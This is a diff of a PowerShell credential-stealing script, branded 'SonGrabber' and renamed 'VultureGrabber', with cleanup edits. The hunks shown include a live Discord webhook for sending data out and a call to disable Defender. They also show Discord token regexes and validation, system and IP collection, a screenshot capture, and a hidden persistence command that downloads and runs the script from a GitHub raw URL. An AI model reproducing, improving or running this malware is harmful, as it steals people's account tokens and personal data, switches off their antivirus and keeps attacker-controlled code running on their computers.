@@ -48,15 +48,15 @@ try {
     }
 } catch {}
 
-# === CONFIG (direct assignment, no double-encode overhead) ===
- $myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1"
- $hook  = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
- $api   = "https://discord.com/api/v9/users/@me"
- $rgx   = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
- $mfa   = 'mfa\.[\w-]{84}'
- $brand = "SonGrabber"
+# === CONFIG ===
+$myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1"
+$hook  = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
+$api   = "https://discord.com/api/v9/users/@me"
+$rgx   = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
+$mfa   = 'mfa\.[\w-]{84}'
+$brand = "VultureGrabber"
 
- $ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 [System.Net.ServicePointManager]::Expect100Continue = $false
 [System.Net.ServicePointManager]::DefaultConnectionLimit = 10
@@ -65,9 +65,9 @@ Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.Drawing
 
 # === FIRST RUN FLAG ===
- $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")
- $flagKey = "HKCU:\Software\Classes\AppX42fc9k6x7c0r3d7mb3w8q3x7hrd8e8t"
- $firstRun = $true
+$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")
+$flagKey = "HKCU:\Software\Classes\AppX42fc9k6x7c0r3d7mb3w8q3x7hrd8e8t"
+$firstRun = $true
 if (-not $isSystem) {
     try {
         $existing = Get-ItemProperty -Path $flagKey -ErrorAction SilentlyContinue
@@ -103,10 +103,10 @@ function Disable-Defender {
 Disable-Defender
 
 # === SYSTEM INFO ===
- $pc  = $env:COMPUTERNAME
- $usr = $env:USERNAME
- $os  = [System.Environment]::OSVersion.VersionString
- $adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$pc  = $env:COMPUTERNAME
+$usr = $env:USERNAME
+$os  = [System.Environment]::OSVersion.VersionString
+$adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 try {
     $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3 -ErrorAction SilentlyContinue)
 } catch { $ip = "unknown" }
@@ -163,7 +163,7 @@ function Validate-Token {
     } catch { return $false }
 }
 
- $found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
+$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
 
 if (-not $isSystem -and $firstRun) {
     $ldbPaths = [System.Collections.Generic.List[string]]::new()
@@ -237,8 +237,8 @@ if (-not $isSystem -and $firstRun) {
     }
 }
 
-# === TOKEN VALIDATION (parallelized via runspace pool) ===
- $validTokens = [System.Collections.Generic.List[object]]::new()
+# === TOKEN VALIDATION ===
+$validTokens = [System.Collections.Generic.List[object]]::new()
 
 if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
     $validated = [System.Collections.Generic.List[string]]::new()
@@ -269,21 +269,23 @@ if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
 }
 
 # === SCREENSHOT ===
- $screenshotB64 = $null
+$screenshotB64 = $null
 if ($firstRun) { $screenshotB64 = Get-ScreenCapture }
 
 # === BUILD AND SEND WEBHOOK ===
 if ($firstRun) {
     $bt = "```"
     $fields = @(
-        @{ name = "IP"; value = $ip; inline = $true }
-        @{ name = "PC"; value = $pc; inline = $true }
-        @{ name = "User"; value = $usr; inline = $true }
-        @{ name = "Admin"; value = $adm; inline = $true }
-        @{ name = "OS"; value = $os; inline = $true }
+        @{ name = "IP"; value = $ip; inline = $true },
+        @{ name = "PC"; value = $pc; inline = $true },
+        @{ name = "User"; value = $usr; inline = $true },
+        @{ name = "Admin"; value = $adm; inline = $true },
+        @{ name = "OS"; value = $os; inline = $true },
         @{ name = "Tokens"; value = $validTokens.Count; inline = $true }
     )
-    if ($screenshotB64) { $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false } }
+    if ($screenshotB64) { 
+        $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false } 
+    }
 
     foreach ($ti in $validTokens) {
         $fields += @{ name = $ti.u; value = "$bt$($ti.token)$bt"; inline = $false }
@@ -327,8 +329,8 @@ if ($firstRun) {
 }
 
 # === PERSISTENCE ===
- $psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm '$myUrl')`""
- $psCmd  = "powershell.exe $psArgs"
+$psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm '$myUrl')`""
+$psCmd  = "powershell.exe $psArgs"
 
 if (-not $isSystem) {
     try {
